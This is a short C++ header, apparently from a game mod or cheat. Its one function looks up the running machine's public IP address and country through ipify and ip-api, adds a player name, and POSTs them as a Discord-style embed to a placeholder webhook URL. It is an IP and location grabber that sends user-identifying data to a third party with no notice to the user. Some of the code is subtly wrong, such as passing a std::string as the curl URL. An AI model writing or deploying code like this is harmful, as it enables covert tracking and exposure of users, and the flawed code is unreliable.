#pragma once
#include <curl/curl.h>
int postmain()
{
	HTTPDownloader downloader2;
	std::string info = downloader2.download("https://api.ipify.org/");

	HTTPDownloader downloader3;
	std::string count = downloader3.download("http://ip-api.com/line/?fields=1");

	std::string user = *PlayerName;

	CURL *curl;
	CURLcode res;
	/*2 lazy to make one better meh*/
	std::string msg1 = "{  \"embeds\": [{     \"title\": \"";
	std::string msg2 = user;
	msg2.erase(std::remove(msg2.begin(), msg2.end(), '\n'), msg2.end());
	std::string msg3 = "\",     \"fields\": [       {         \"name\": \"Country\",         \"value\": \"";
	std::string msg4 = count;
	msg4.erase(std::remove(msg4.begin(), msg4.end(), '\n'), msg4.end());
	std::string msg17 = "\"      },       {         \"name\": \"IP\",         \"value\": \"";
	std::string msg18 = info;
	msg18.erase(std::remove(msg18.begin(), msg18.end(), '\n'), msg18.end());
	std::string msg19 = "\"       }     ]   }] }";
	std::string fullmsg = msg1 + msg2 + msg3 + msg4 + msg17 + msg18 + msg19;
	static const char *postthis = fullmsg.c_str();

	curl = curl_easy_init();
	if (curl) {
		std::string fulll = "PUTHEREURWEBHOOOKURL";
		curl_easy_setopt(curl, CURLOPT_URL, fulll);
		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postthis);

		/* if we don't provide POSTFIELDSIZE, libcurl will strlen() by
		itself */
		curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(postthis));

		/* Perform the request, res will get the return code */
		res = curl_easy_perform(curl);
		/* Check for errors */
		if (res != CURLE_OK)
			fprintf(stderr, "curl_easy_perform() failed: %s\n",
				curl_easy_strerror(res));

		/* always cleanup */
		curl_easy_cleanup(curl);
	}
	return 0;
}